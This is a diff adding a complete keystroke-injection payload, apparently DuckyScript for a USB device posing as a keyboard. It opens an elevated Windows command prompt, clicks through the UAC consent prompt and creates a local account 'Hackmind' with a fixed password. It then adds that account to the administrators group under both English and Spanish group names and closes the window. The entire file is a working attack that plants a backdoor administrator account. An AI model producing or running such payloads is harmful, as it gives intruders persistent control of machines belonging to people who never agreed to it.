@@ -1,0 +1,19 @@
+DELAY 1000
+DEFAULTDELAY 500
+GUI R
+STRING CMD
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 2000
+STRING net user /add Hackmind Admin123
+ENTER
+DELAY 2000
+STRING net localgroup administrators Hackmind /add
+ENTER
+STRING net localgroup administradores Hackmind /add
+ENTER
+DELAY 1000
+STRING exit
+ENTER
